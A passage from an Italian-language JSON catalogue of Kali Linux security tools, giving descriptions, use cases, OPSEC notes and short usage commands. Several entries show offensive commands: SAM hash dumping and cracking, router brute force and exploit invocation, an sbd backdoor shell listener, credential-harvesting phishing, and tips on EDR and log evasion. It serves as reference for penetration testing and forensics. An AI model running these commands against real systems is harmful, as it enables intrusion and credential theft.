OPSEC</h4><p><strong>Legal:</strong> accesso a bucket non autorizzati potrebbe essere illegale.</p><p><strong>Rate limiting:</strong> AWS può limitare richieste eccessive.</p><p><strong>Logging:</strong> accessi S3 loggati in CloudTrail.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "samdump2",
    "name": "samdump2",
    "version": "3.0.0",
    "icon": "../app/icons/samdump2-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/samdump2/",
    "desc": "Estrae hash password da file SAM e SYSTEM Windows per cracking offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>samdump2</strong> estrae hash password NTLM/LM dal file SAM di Windows usando la chiave di cifratura dal file SYSTEM. Permette cracking offline degli hash con hashcat/john dopo aver ottenuto i file da sistema target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Hash Extraction:</strong> estrae NTLM e LM hash dal SAM</p><p><strong>SYSTEM Key:</strong> usa bootkey da SYSTEM per decifratura</p><p><strong>Offline:</strong> lavora su file exportati, non sistema live</p><p><strong>Output Format:</strong> formato compatibile con john/hashcat</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Estrazione hash\nsamdump2 SYSTEM SAM\n\n# Output su file per cracking\nsamdump2 SYSTEM SAM > hashes.txt\n\n# Poi cracking con hashcat\nhashcat -m 1000 hashes.txt wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>password cracking</strong>, recupero password da SAM offline.</p><p>Per <strong>forensics</strong>, analisi credenziali su sistema sequestrato.</p><p>Per <strong>pentest</strong>, crack hash dopo dump SAM.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>File Access:</strong> SAM e SYSTEM sono bloccati su sistema live.</p><p><strong>Boot CD:</strong> usare Kali Live o simile per accesso offline.</p><p><strong>Reg save:</strong> può copiare hive da sistema con privilegi admin.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "sara",
    "name": "sara",
    "version": "1.2",
    "icon": "../app/icons/sara-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sara/",
    "desc": "RouterOS security auditing: brute force, config dump, exploit Winbox su Mikrotik.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SARA</strong> (Sekurak RouterOS Audit) è un tool per security assessment di dispositivi Mikrotik RouterOS. Supporta brute force credenziali, dump configurazione, exploit di vulnerabilità Winbox note e enumeration di servizi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Brute:</strong> attacco password su SSH, Telnet, Winbox</p><p><strong>Config Dump:</strong> estrazione configurazione router</p><p><strong>Winbox Exploits:</strong> sfruttamento vulnerabilità note</p><p><strong>Enumeration:</strong> discovery versione e servizi attivi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan e enumeration\nsara -t 192.168.1.1\n\n# Brute force\nsara -t 192.168.1.1 -b -u admin -P passwords.txt\n\n# Exploit CVE specifico\nsara -t 192.168.1.1 -e winbox_auth_bypass</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network pentest</strong>, assessment router Mikrotik.</p><p>Per <strong>ISP audit</strong>, verifica sicurezza infrastruttura.</p><p>Per <strong>research</strong>, test vulnerabilità RouterOS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> brute force può bloccare account.</p><p><strong>Logging:</strong> tentativi loggati su router.</p><p><strong>Updates:</strong> Mikrotik patcha vulnerabilità regolarmente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "IoT"
    ],
    "notes": null
  },
  {
    "id": "sbd",
    "name": "sbd",
    "version": "1.37",
    "icon": "../app/icons/sbd-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sbd/",
    "desc": "Secure Backdoor: netcat crittografato con AES per comunicazioni covert persistenti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SBD</strong> (Secure BackDoor) è una versione crittografata di netcat che utilizza AES-CBC-128 per cifrare le comunicazioni. Fornisce shell remote sicure, trasferimento file crittografato e può essere usato per comunicazioni covert.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AES Encryption:</strong> traffico cifrato con AES-CBC-128</p><p><strong>Shared Secret:</strong> autenticazione con password condivisa</p><p><strong>Netcat Compatible:</strong> sintassi simile a netcat</p><p><strong>Cross-platform:</strong> versioni per Linux e Windows</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Listener con password\nsbd -l -p 4444 -k secret\n\n# Connessione client\nsbd target_ip 4444 -k secret\n\n# Shell remota\nsbd -l -p 4444 -k secret -e /bin/sh\n\n# File transfer\nsbd -l -p 4444 -k secret < file.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>secure C2</strong>, comunicazioni crittografate con backdoor.</p><p>Per <strong>pivoting</strong>, tunnel sicuri attraverso reti ostili.</p><p>Per <strong>exfiltration</strong>, trasferimento dati cifrato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> traffico cifrato anomalo può essere rilevato.</p><p><strong>Key exchange:</strong> chiave deve essere condivisa out-of-band.</p><p><strong>Forensics:</strong> binario su disco è evidenza.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "scalpel",
    "name": "scalpel",
    "version": "1.60",
    "icon": "../app/icons/scalpel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/scalpel/",
    "desc": "File carver veloce per recupero dati da immagini disco basato su header/footer.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Scalpel</strong> è un file carver veloce e indipendente dal filesystem. Recupera file da immagini disco basandosi su header e footer di file type noti. Fork di Foremost ottimizzato per velocità e ridotto uso memoria.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Signature-based:</strong> recupero basato su magic bytes</p><p><strong>Filesystem-agnostic:</strong> funziona su qualsiasi filesystem o raw</p><p><strong>Configurable:</strong> definizione custom di header/footer</p><p><strong>Fast:</strong> ottimizzato per prestazioni su grandi immagini</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Carving con config default\nscalpel disk.img -o output_dir/\n\n# Con config personalizzato\nscalpel -c custom_scalpel.conf disk.img -o output/\n\n# Su device raw\nscalpel /dev/sdb -o recovered/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>forensics</strong>, recupero file cancellati da immagini.</p><p>Per <strong>data recovery</strong>, recupero da dischi corrotti.</p><p>Per <strong>incident response</strong>, estrazione artefatti da sistemi compromessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Fragmentation:</strong> file frammentati potrebbero non essere recuperati completamente.</p><p><strong>False positives:</strong> signature match può produrre file corrotti.</p><p><strong>Space:</strong> output può essere molto grande.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "File_Carving"
    ],
    "notes": null
  },
  {
    "id": "scapy",
    "name": "scapy",
    "version": "2.6.1",
    "icon": "../app/icons/scapy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/scapy/",
    "desc": "Libreria Python per manipolazione pacchetti: forging, sniffing, fuzzing a basso livello.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Scapy</strong> è una potente libreria Python per manipolazione pacchetti di rete a basso livello. Permette forging, sending, sniffing, parsing e fuzzing di pacchetti per qualsiasi protocollo. Strumento fondamentale per network security research.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Packet Crafting:</strong> costruzione pacchetti layer by layer</p><p><strong>Sniffing:</strong> cattura e analisi traffico di rete</p><p><strong>Protocol Support:</strong> TCP, UDP, ICMP, ARP, DNS, HTTP e centinaia altri</p><p><strong>Fuzzing:</strong> generazione pacchetti malformati per testing</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Shell interattiva\nscapy\n\n# Crafting e invio pacchetto\n>>> send(IP(dst=\"target\")/ICMP())\n\n# Sniffing\n>>> sniff(filter=\"tcp port 80\", count=10)\n\n# SYN scan\n>>> sr1(IP(dst=\"target\")/TCP(dport=80,flags=\"S\"))</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network research</strong>, analisi e testing protocolli.</p><p>Per <strong>exploit development</strong>, crafting pacchetti per vulnerabilità.</p><p>Per <strong>fuzzing</strong>, testing robustezza stack di rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Raw sockets:</strong> richiede privilegi root.</p><p><strong>Detection:</strong> pacchetti malformati facilmente rilevabili.</p><p><strong>Learning:</strong> richiede conoscenza protocolli di rete.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "scrounge-ntfs",
    "name": "scrounge-ntfs",
    "version": "0.9",
    "icon": "../app/icons/scrounge-ntfs-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/scrounge-ntfs/",
    "desc": "Recupera file da partizioni NTFS danneggiate ricostruendo MFT entries.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Scrounge-ntfs</strong> è un tool di data recovery specializzato nel recupero di file da partizioni NTFS (New Technology File System) corrotte o danneggiate. Opera ricostruendo le entry della Master File Table (MFT), la struttura fondamentale di NTFS che contiene metadati su ogni file e directory. Quando la MFT è parzialmente danneggiata ma i dati sono ancora fisicamente presenti sui settori del disco, scrounge-ntfs può localizzare e estrarre file che tool di recovery standard non riescono a vedere. È particolarmente efficace in scenari di corruzione del filesystem causata da scollegamento improprio, crash di sistema, settori danneggiati, o danni logici alla struttura NTFS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MFT Reconstruction:</strong> Analizza i record MFT danneggiati o parzialmente sovrascritti, ricostruendo le informazioni necessarie per localizzare i dati dei file. Può recuperare entry MFT anche quando la MFT mirror è corrotta.</p><p><strong>Metadata Preservation:</strong> Durante il recupero, preserva i metadati originali dei file: timestamp di creazione/modifica/accesso, attributi, e struttura delle directory quando possibile.</p><p><strong>Sector-Level Scanning:</strong> Scansiona il disco settore per settore cercando signature di record MFT. Non si affida alla struttura del filesystem ma la ricostruisce dai dati raw.</p><p><strong>NTFS-Specific Optimization:</strong> Comprende profondamente le strutture NTFS: attribute headers, resident/non-resident data, runlists per file frammentati, alternate data streams, e compressed files.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scrounge-ntfs opera su dispositivi block o immagini disco.</p><pre><code># Recovery base da partizione NTFS\nscrounge-ntfs /dev/sdb1 /mnt/recovered/\n# Estrae tutti i file recuperabili in /mnt/recovered/\n\n# Specificare range di settori\nscrounge-ntfs -s 0 -e 1000000 /dev/sdb1 /output/\n# -s: settore iniziale\n# -e: settore finale\n# Utile per limitare scan a porzioni specifiche\n\n# Recovery da immagine disco (dd image)\nscrounge-ntfs disk.img /recovered/\n\n# Recovery da immagine con offset partizione\nscrounge-ntfs -o 2048 disk.img /recovered/\n# -o: offset in settori dall'inizio dell'immagine\n\n# Workflow tipico forense:\n# 1. Crea immagine read-only\ndd if=/dev/sdb of=evidence.img bs=4M conv=noerror,sync\n\n# 2. Calcola hash per chain of custody\nsha256sum evidence.img > evidence.sha256\n\n# 3. Recupera file dall'immagine\nscrounge-ntfs evidence.img /case/recovered/\n\n# 4. Verifica integrity\nsha256sum evidence.img | diff - evidence.sha256</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Data Recovery da Corruzione</strong>, quando una partizione NTFS non monta più a causa di corruzione del filesystem, scrounge-ntfs può recuperare file direttamente dai settori raw. Efficace dopo crash di sistema, rimozione impropria di drive USB, o danni al boot sector.</p><p>Nella <strong>Digital Forensics</strong>, l'analisi di sistemi Windows con filesystem danneggiato è comune. Scrounge-ntfs permette di estrarre evidenze anche quando il sistema operativo non può più accedere al disco.</p><p>Durante <strong>Incident Response Post-Ransomware</strong>, alcuni ransomware danneggiano la struttura NTFS oltre a cifrare i file. Scrounge-ntfs può recuperare file non cifrati da aree non raggiungibili tramite metodi standard.</p><p>Per <strong>Recovery di File Cancellati</strong>, file recentemente cancellati i cui record MFT non sono ancora sovrascritti possono essere recuperati, anche se lo spazio è stato marcato come libero.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-Only Operation:</strong> Scrounge-ntfs legge solo dal dispositivo sorgente, non scrive mai su di esso. Preserva l'integrità forense del disco originale.</p><p><strong>NTFS Only:</strong> Funziona esclusivamente con filesystem NTFS. Per altri filesystem (ext4, HFS+, APFS), usare tool specifici come ext4magic, photorec, o testdisk.</p><p><strong>Fragmentation Limitations:</strong> File molto frammentati potrebbero essere recuperati solo parzialmente se le runlist nella MFT sono danneggiate. Cluster non contigui potrebbero mancare.</p><p><strong>Encrypted Files:</strong> File cifrati con EFS (Encrypting File System) o BitLocker vengono recuperati nella loro forma cifrata. La decrittazione richiede le chiavi appropriate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "File_Carving"
    ],
    "notes": null
  },
  {
    "id": "sctpscan",
    "name": "sctpscan",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sctpscan/",
    "desc": "Scanner per protocollo SCTP usato in telecomunicazioni e reti SS7.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SCTPscan</strong> è uno scanner di rete specializzato nel protocollo SCTP (Stream Control Transmission Protocol), un protocollo di trasporto Layer 4 alternativo a TCP/UDP, ampiamente utilizzato in telecomunicazioni. SCTP è il protocollo di trasporto principale per SS7 over IP (SIGTRAN), Diameter (successore di RADIUS per reti mobili), e alcune implementazioni VoIP. A differenza di nmap che ha supporto SCTP limitato, SCTPscan è costruito specificamente per questo protocollo: può enumerare porte SCTP aperte, tentare l'establishment di associazioni, e identificare servizi telco. Essenziale per security assessment di infrastrutture di telecomunicazione, backbone di operatori mobili, e reti di segnalazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SCTP Port Discovery:</strong> Invia INIT chunk SCTP per identificare porte con servizi attivi. Analizza le risposte (INIT-ACK o ABORT) per determinare lo stato della porta. Supporta scan di range o porte specifiche.</p><p><strong>Association Establishment:</strong> Può tentare di completare il 4-way handshake SCTP (INIT, INIT-ACK, COOKIE-ECHO, COOKIE-ACK) per verificare la possibilità di stabilire connessioni complete.</p><p><strong>Telecom-Focused Defaults:</strong> Include preset per porte comuni in ambienti telco: M3UA (2905), M2PA (3565), SUA (14001), Diameter (3868), permettendo scan rapidi di infrastrutture di segnalazione.</p><p><strong>Multi-homing Support:</strong> SCTP supporta multi-homing (multiple IP per associazione). SCTPscan può rilevare e testare endpoint con configurazioni multi-home.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SCTPscan richiede privilegi root per raw socket SCTP.</p><pre><code># Scan base su singolo host\nsudo sctpscan -t 192.168.1.100\n\n# Scan range di porte specifico\nsudo sctpscan -t 192.168.1.100 -p 1-10000\n\n# Scan subnet\nsudo sctpscan -t 192.168.1.0/24\n\n# Porte SS7/SIGTRAN comuni\nsudo sctpscan -t target -p 2905,2945,3565,14001\n# 2905: M3UA\n# 2945: M3UA alternate\n# 3565: M2PA\n# 14001: SUA\n\n# Porte Diameter\nsudo sctpscan -t target -p 3868,3869\n# 3868: Diameter default\n# 3869: Diameter TLS\n\n# Scan verboso per debug\nsudo sctpscan -t target -p 3868 -v\n\n# Output tipico:\n# SCTP Port 3868 [OPEN] - Diameter\n# SCTP Port 2905 [OPEN] - M3UA\n# SCTP Port 22 [CLOSED]\n\n# Combinazione con nmap per service identification\nnmap -sY -p 3868 --script=default target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Telecom Security Assessment</strong>, SCTPscan è fondamentale per audit di sicurezza su reti di operatori mobili e fissi. Le interfacce SIGTRAN/Diameter spesso non sono adeguatamente protette, esponendo l'infrastruttura di segnalazione.</p><p>Durante <strong>SS7/SIGTRAN Penetration Testing</strong>, il primo step è identificare endpoint SCTP esposti. M3UA, M2PA, e SUA sono gateway verso la rete SS7 core. L'accesso può permettere intercettazione SMS, tracking location, e altri attacchi telco.</p><p>Nel <strong>VoIP Security Testing</strong>, alcune implementazioni VoIP enterprise usano SCTP per SIP. SCTPscan identifica questi endpoint che potrebbero essere vulnerabili.</p><p>Per <strong>Diameter Security</strong>, le interfacce Diameter in reti 4G/5G gestiscono autenticazione e roaming. Endpoint esposti possono permettere attacchi su subscriber identity e billing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Protocollo Niche:</strong> SCTP è raro fuori da ambienti telco. Scan SCTP su reti corporate normali produrranno pochi risultati ma potrebbero essere loggati come anomali.</p><p><strong>Telecom Network Isolation:</strong> Le reti di segnalazione telco sono tipicamente isolate da internet pubblico. L'accesso richiede posizione privilegiata (inside roaming partner, compromissione VPN telco, etc.).</p><p><strong>Heavy Monitoring:</strong> Infrastrutture telco critiche sono monitorate intensamente. Scan non autorizzati generano alert immediati e potenziali conseguenze legali severe.</p><p><strong>Authorization Critical:</strong> Assessment di infrastrutture telco richiede autorizzazione formale dall'operatore. Scan non autorizzati su reti SS7 possono costituire reato in molte giurisdizioni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "secure-socket-funneling",
    "name": "secure-socket-funneling",
    "version": "3.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/secure-socket-funneling/",
    "desc": "Tunneling TCP/UDP attraverso TLS con forward/reverse proxy per pivoting sicuro.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Secure Socket Funneling (SSF) è un tool di tunneling network che crea connessioni cifrate con TLS per trasportare traffico TCP e UDP attraverso reti ostili o firewall. A differenza di SSH tunneling che supporta solo TCP, SSF gestisce nativamente entrambi i protocolli, rendendolo ideale per tunneling di DNS, VoIP, e altri protocolli UDP-based. SSF implementa forward port forwarding (-L), reverse port forwarding (-R), SOCKS proxy (-D), e può creare catene multi-hop attraverso relay server multipli. L'architettura client-server con crittografia TLS fa apparire il traffico come normali connessioni HTTPS, facilitando il bypass di firewall e inspection basata su porta.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TLS Encrypted Tunnels:</strong> Tutto il traffico tra client e server è cifrato con TLS 1.2/1.3. Supporta certificati custom per autenticazione mutua. Il traffico appare come connessione HTTPS standard a inspection superficiale.</p><p><strong>Native UDP Support:</strong> A differenza di SSH, SSF tunnela nativamente traffico UDP senza incapsulamento TCP aggiuntivo. Essenziale per DNS tunneling, VoIP, streaming, e gaming dove la latenza UDP è critica.</p><p><strong>Multiple Proxy Modes:</strong> Forward proxy (-L): porta locale verso host remoto. Reverse proxy (-R): porta remota verso host locale. SOCKS proxy (-D): proxy SOCKS4/5 completo per browsing e tool generici.</p><p><strong>Multi-Hop Chaining:</strong> SSF può creare catene di tunnel attraverso multipli relay server, aggiungendo layer di indirection e rendendo il traceback più difficile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SSF ha architettura client (ssf) e server (ssfd). I certificati sono necessari per TLS.</p><pre><code># === SETUP SERVER ===\n# Genera certificati (se non esistenti)\nopenssl req -x509 -nodes -newkey rsa:4096 -keyout server.key -out server.crt -days 365\n\n# Avvia server SSF\nssfd -p 8443\n# Default: ascolta su tutte le interfacce, porta 8443\n\n# === LOCAL PORT FORWARD (-L) ===\n# Forward porta locale 9000 verso internal:22 attraverso relay\nssf -L 9000:internal.target.com:22 -p 8443 relay.server.com\n# Connessioni a localhost:9000 vanno a internal.target.com:22\n\n# === REMOTE PORT FORWARD (-R) ===\n# Esponi porta locale 22 sulla porta 9000 del relay\nssf -R 9000:localhost:22 -p 8443 relay.server.com\n# Connessioni a relay:9000 raggiungono il client su porta 22\n\n# === SOCKS PROXY (-D) ===\n# Crea SOCKS proxy su porta 1080\nssf -D 1080 -p 8443 relay.server.com\n# Configura browser/tool per usare SOCKS5 localhost:1080\n\n# === UDP TUNNELING (-U) ===\n# Forward UDP porta locale 5353 verso DNS interno\nssf -U 5353:10.0.0.1:53 -p 8443 relay.server.com\n# DNS queries a localhost:5353/udp raggiungono 10.0.0.1:53\n\n# === MULTI-HOP ===\n# Attraverso due relay\nssf -L 9000:final:22 -p 8443 relay1.com -p 8443 relay2.com\n\n# === CON CERTIFICATI CUSTOM ===\nssf -L 9000:target:22 -p 8443 relay.com \\\n  --cert client.crt --key client.key --ca ca.crt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Pivoting</strong>, dopo aver compromesso un host in una rete target, SSF permette di creare tunnel verso l'interno. La vittima diventa relay per raggiungere sistemi non direttamente accessibili.</p><p>Nel <strong>Firewall Bypass</strong>, molti firewall permettono traffico HTTPS (443) ma bloccano SSH (22). SSF su porta 443 appare come HTTPS legittimo, bypassando policy restrittive.</p><p>Per <strong>UDP Protocol Tunneling</strong>, applicazioni che richiedono UDP (DNS, VoIP, some VPN) possono essere tunnelate attraverso ambienti che bloccano UDP ma permettono TCP/HTTPS.</p><p>Durante <strong>Red Team Operations</strong>, SSF fornisce canali di comunicazione cifrati che si mimetizzano nel traffico HTTPS normale. I certificati custom permettono autenticazione mutua escludendo altri client.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>TLS Appearance:</strong> Il traffico appare come HTTPS ma deep packet inspection può notare pattern anomali: certificati self-signed, SNI mancante, traffic patterns non-HTTP.</p><p><strong>Certificate Management:</strong> Usare CA e certificati propri per autenticazione. Certificati di default sono conosciuti. La compromissione della CA compromette tutto il sistema.</p><p><strong>Logging:</strong> Sia client che server possono essere configurati per logging dettagliato. In operazioni sensibili, disabilitare o redirigere log appropriatamente.</p><p><strong>Endpoint Detection:</strong> EDR possono rilevare binary SSF o behavior di tunneling (molte connessioni a singolo host, traffic patterns regolari). Considerare obfuscation o uso di porte standard.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "sendemail",
    "name": "sendemail",
    "version": "1.56",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sendemail/",
    "desc": "Invia email da CLI con supporto SMTP auth, TLS e allegati per test phishing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>sendEmail</strong> è un tool CLI per invio email con supporto SMTP authentication, TLS/SSL e allegati. Utile per test di phishing, notifiche automatizzate da script e verifica configurazione server email.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SMTP Auth:</strong> supporto autenticazione PLAIN, LOGIN, CRAM-MD5</p><p><strong>TLS/SSL:</strong> connessioni sicure a server email</p><p><strong>Attachments:</strong> invio file allegati</p><p><strong>HTML Email:</strong> supporto corpo email HTML</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Email semplice\nsendemail -f sender@mail.com -t target@mail.com -u \"Subject\" -m \"Body\" -s smtp.server.com\n\n# Con autenticazione\nsendemail -f from@mail.com -t to@mail.com -u \"Subject\" -m \"Body\" -s smtp:587 -xu user -xp pass -o tls=yes\n\n# Con allegato\nsendemail -f from@mail.com -t to@mail.com -u \"Subject\" -m \"Body\" -a file.pdf -s smtp.server.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>phishing tests</strong>, invio email di test in campagne autorizzate.</p><p>Per <strong>automation</strong>, notifiche email da script.</p><p>Per <strong>SMTP testing</strong>, verifica configurazione server.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> server SMTP loggano invii.</p><p><strong>SPF/DKIM:</strong> email spoofate potrebbero essere bloccate.</p><p><strong>Headers:</strong> IP sorgente visibile negli header.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "set",
    "name": "set",
    "version": "8.0.3",
    "icon": "../app/icons/set-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/set/",
    "desc": "Social Engineering Toolkit: phishing, credential harvester, payload injection e spear-phishing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SET</strong> (Social Engineering Toolkit) è il framework standard per attacchi di social engineering. Include moduli per phishing, credential harvesting, payload generation, spear-phishing con allegati malevoli e molto altro. Sviluppato da TrustedSec.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Website Clone:</strong> clona siti per credential harvesting</p><p><strong>Spear-phishing:</strong> email con payload malevoli</p><p><strong>Payload Generator:</strong> integrazione con Metasploit</p><p><strong>USB/CD Attack:</strong> autorun per media fisici</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio SET\nsetoolkit\n\n# Menu principale\n1) Social-Engineering Attacks\n2) Website Attack Vectors\n3) Credential Harvester\n\n# Esempio credential harvester\n# Clone sito -> inserisci URL -> attendi credenziali</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>phishing assessment</strong>, test awareness dipendenti.</p><p>Per <strong>red team</strong>, initial access via social engineering.</p><p>Per <strong>training</strong>, dimostrazioni su rischi phishing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Authorization:</strong> richiede sempre autorizzazione scritta.</p><p><strong>Legal:</strong> phishing non autorizzato è illegale.</p><p><strong>Infra:</strong> domain e hosting per campagne realistiche.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "sfuzz",
    "name": "sfuzz",
    "version": "0.7.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sfuzz/",
    "desc": "Simple fuzzer per protocolli di rete con pattern e payload personalizzabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sfuzz</strong> è un fuzzer semplice per protocolli di rete. Invia payload personalizzabili a servizi TCP/UDP per identificare crash, memory corruption e altre vulnerabilità. Approccio leggero e configurabile per vulnerability research.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Agnostic:</strong> fuzzing su qualsiasi protocollo TCP/UDP</p><p><strong>Pattern Based:</strong> definizione pattern con placeholder fuzz</p><p><strong>Incremental:</strong> incremento graduale dimensione payload</p><p><strong>Configurable:</strong> template personalizzabili per ogni protocollo</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Fuzzing con config file\nsfuzz -f config.sfz\n\n# Config file esempio\n# tcp\n# 192.168.1.1:80\n# GET /%%FUZZ%% HTTP/1.0\n\n# Con incremento lunghezza\nsfuzz -f config.sfz -l 1000 -i 100</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>vulnerability research</strong>, discovery bug in servizi custom.</p><p>Per <strong>protocol testing</strong>, robustezza parser di protocollo.</p><p>Per <strong>learning</strong>, introduzione al fuzzing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Crashes:</strong> fuzzing può crashare servizi.</p><p><strong>Detection:</strong> traffico anomalo facilmente rilevabile.</p><p><strong>DoS:</strong> può causare denial of service non intenzionale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "sharphound",
    "name": "sharphound",
    "version": "2.7.1",
    "icon": "../app/icons/sharphound-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sharphound/",
    "desc": "Collector BloodHound per AD: enumera utenti, gruppi, sessioni, ACL per attack paths.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpHound</strong> è il collector ufficiale per BloodHound, enumera Active Directory raccogliendo utenti, gruppi, computer, sessioni, ACL e trust. I dati vengono importati in BloodHound per visualizzare e scoprire attack paths verso Domain Admin.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Complete Enumeration:</strong> utenti, gruppi, computer, GPO, OU</p><p><strong>Session Collection:</strong> sessioni attive per mappare lateral movement</p><p><strong>ACL Analysis:</strong> permessi e deleghe pericolose</p><p><strong>Stealth Modes:</strong> opzioni per ridurre rumore</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Collection completa\nSharpHound.exe -c All\n\n# Solo sessioni (più stealth)\nSharpHound.exe -c Session\n\n# Con dominio specifico\nSharpHound.exe -c All -d domain.local\n\n# Loop per sessioni continue\nSharpHound.exe -c Session --loop</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD assessment</strong>, mappatura completa attack paths.</p><p>Per <strong>privesc planning</strong>, identificazione percorsi verso Domain Admin.</p><p>Per <strong>security audit</strong>, 